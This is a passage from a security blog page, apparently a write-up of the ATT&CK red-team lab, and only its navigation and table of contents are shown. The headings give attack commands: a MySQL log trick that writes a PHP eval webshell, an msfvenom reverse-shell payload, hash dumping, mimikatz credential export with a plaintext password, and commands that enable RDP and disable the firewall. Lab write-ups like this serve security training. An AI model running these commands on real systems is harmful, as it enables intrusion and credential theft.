
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../../pwn/xctf--pwn--%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/">
      
      
        <link rel="next" href="../ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
    
    
      
        <title>ATTCK红队评估01 - DarkLord-W's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#_1" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="DarkLord-W&#39;s Blog" class="md-header__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
      
  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            DarkLord-W's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              ATTCK红队评估01
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="DarkLord-W&#39;s Blog" class="md-nav__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
      
  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">

    </a>
    DarkLord-W's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    PortSwigger Academy
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            PortSwigger Academy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../PortSwigger-Academy/File%20upload%20vulnerabilities/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    File upload vulnerabilities
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_format0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar format0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_format1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar format1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_format2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar format2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_heap0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar heap0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_heap1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar heap1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack3
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack4
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack5/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar stack5
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar stack6
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/Protostar_stack7/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar stack7
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/bamboofox-ret2syscall-rop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    bamboofox-ret2syscall-rop
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwn-sniper-01/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwn-sniper-01
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwn-sniper-02/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwn-sniper-02
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwn-sniper-03/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwn-sniper-03
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--bof/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--bof
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--collision/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--collision
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--fd%20--%20%28File%20descriptor%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--fd -- (File descriptor)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--flag--%28reverse%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--flag--(reverse)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--input/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--input
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--passcode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--passcode
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/pwnable--random/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--random
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/ret2shellcode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ret2shellcode
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/stack_test/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    stack_test
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pwn/xctf--pwn--%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    xctf--pwn--反应釜开关控制
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    ATTCK红队评估01
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    ATTCK红队评估01
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      拓扑环境如下：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      网卡配置如下：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kali-19216855123" class="md-nav__link">
    <span class="md-ellipsis">
      kali: 192.168.55.123
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win7-19216855130-19216852143" class="md-nav__link">
    <span class="md-ellipsis">
      win7: 192.168.55.130 &amp;&amp; 192.168.52.143(内网网卡)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win2003-19216852141" class="md-nav__link">
    <span class="md-ellipsis">
      win2003: 192.168.52.141(域内主机)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win2008-19216852138" class="md-nav__link">
    <span class="md-ellipsis">
      win2008: 192.168.52.138(域控)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      web渗透：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#win7ip19216855130803306" class="md-nav__link">
    <span class="md-ellipsis">
      首先，进行主机发现，看到win7的主机ip为192.168.55.130,开放了80和3306端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#80php" class="md-nav__link">
    <span class="md-ellipsis">
      访问80端口，出现php探针页面
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web_1" class="md-nav__link">
    <span class="md-ellipsis">
      扫描web目录
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rootrootphpmyadmin" class="md-nav__link">
    <span class="md-ellipsis">
      尝试用root/root弱口令登录phpmyadmin,成功登录
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#secure_file_privenullmysqld" class="md-nav__link">
    <span class="md-ellipsis">
      secure_file_prive=null，限制mysqld，不允许导入导出；
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    <span class="md-ellipsis">
      查询日志写入是否开启
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    <span class="md-ellipsis">
      开启日志并修改日志保存路径
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#set-global-general_log-on" class="md-nav__link">
    <span class="md-ellipsis">
      set global general_log = on;
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#set-global-general_log_filecphpstudywwwshellphp" class="md-nav__link">
    <span class="md-ellipsis">
      set global general_log_file='C:\\phpStudy\\WWW\\shell.php';
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#select-php-eval_postashell" class="md-nav__link">
    <span class="md-ellipsis">
      然后select '&lt;?php @eval($_POST[a]);?&gt;'写入shell至日志文件
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shell" class="md-nav__link">
    <span class="md-ellipsis">
      尝试连接shell，成功连接
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#yxcmsgetshell" class="md-nav__link">
    <span class="md-ellipsis">
      也可以通过yxcms进行getshell
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    <span class="md-ellipsis">
      内网渗透：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#msf" class="md-nav__link">
    <span class="md-ellipsis">
      制作一个msf木马并上传至目标服务器，并设置连接
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#msfvenom-p-windowsmeterpreterreverse_tcp-lhost19216855123-lport5678-f-exe-o-shellexe" class="md-nav__link">
    <span class="md-ellipsis">
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.55.123 LPORT=5678 -f exe -o shell.exe
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#psmeterpretre-shellchcp-65001" class="md-nav__link">
    <span class="md-ellipsis">
      PS：meterpretre shell如果乱码，可以输入chcp 65001去除乱码
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#godorgip19216852143" class="md-nav__link">
    <span class="md-ellipsis">
      查看主机信息，可以看到该主机属于god.org域中，内网网卡ip为192.168.52.143
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#systeminfo" class="md-nav__link">
    <span class="md-ellipsis">
      systeminfo信息
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#getsystem" class="md-nav__link">
    <span class="md-ellipsis">
      尝试getsystem并成功
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    <span class="md-ellipsis">
      收集域内信息
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    <span class="md-ellipsis">
      查看域用户
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    <span class="md-ellipsis">
      查看域管
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    <span class="md-ellipsis">
      定位域控，域控一般都为时间服务器
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ip19216852138" class="md-nav__link">
    <span class="md-ellipsis">
      确定域控ip为192.168.52.138
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_24" class="md-nav__link">
    <span class="md-ellipsis">
      接下来迁移会话进程
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_25" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hashdump" class="md-nav__link">
    <span class="md-ellipsis">
      hashdump
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ps-ridlm-hash-nt-hash-rid-windows-linux-uidgid-500-administrator501-guest-lm-hash-nt-hash-hash-cmd5" class="md-nav__link">
    <span class="md-ellipsis">
      PS:格式是：用户名称: RID:LM-HASH 值: NT-HASH 值，rid 是 windows 系统账户对应固定的值，类似于 linux 的 uid，gid 号，500 为 administrator，501 为 guest 等。而 lm 的 hash 和 nt 的 hash,都是对用户密码进行的加密，只不过加密方式不一样。复制其中一种加密的 hash 可以直接使用在线 cmd5 破解
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#systemload-kiwicreds_allhongrisec2019" class="md-nav__link">
    <span class="md-ellipsis">
      由于已经获得system权限，可以加载load kiwi模块，creds_all导出明文密码hongrisec@2019
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_26" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#33893389" class="md-nav__link">
    <span class="md-ellipsis">
      查看3389开放情况，并尝试打开3389,关闭防火墙，连接远程桌面
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#netstat-an-findstr-3389" class="md-nav__link">
    <span class="md-ellipsis">
      netstat -an | findstr “3389”查看远程端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_27" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-00000000-f" class="md-nav__link">
    <span class="md-ellipsis">
      开启3389REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-11111111-f" class="md-nav__link">
    <span class="md-ellipsis">
      关闭3389REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f）
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_28" class="md-nav__link">
    <span class="md-ellipsis">
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_29" class="md-nav__link">
    <span class="md-ellipsis">
      关闭防火墙：
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-server-2003-netsh-firewall-set-opmode-disable" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Server 2003 系统及之前版本netsh firewall set opmode disable
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-server-2003-netsh-advfirewall-set-allprofiles-state-off" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Server 2003 之后系统版本netsh advfirewall set allprofiles state off
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_30" class="md-nav__link">
    <span class="md-ellipsis">
      或者
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3389-netsh-advfirewall-firewall-add-rule-nameremote-desktop-protocoltcp-dirin-localport3389-actionallow" class="md-nav__link">
    <span class="md-ellipsis">
